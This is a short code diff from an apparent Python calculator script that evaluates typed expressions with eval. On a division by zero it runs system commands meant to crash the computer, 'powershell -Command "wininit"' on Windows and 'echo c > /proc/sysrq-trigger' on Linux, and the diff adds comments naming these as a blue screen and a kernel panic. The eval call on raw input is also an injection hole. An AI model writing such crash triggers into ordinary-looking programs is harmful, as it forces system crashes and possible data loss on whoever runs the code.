@@ -25,8 +25,8 @@ while 1:
         print(eval(eq))
     except ZeroDivisionError:
         if SO == "Windows":
-            os.system('powershell -Command "wininit"')
+            os.system('powershell -Command "wininit"') # BSOD for Windows
         elif SO == "Linux":
-            os.system('echo c > /proc/sysrq-trigger')
+            os.system('echo c > /proc/sysrq-trigger') # kernel panic for Linux
         else:
             print("lolz you're not running a supported os, wait 4 supportz m8!!!!!")
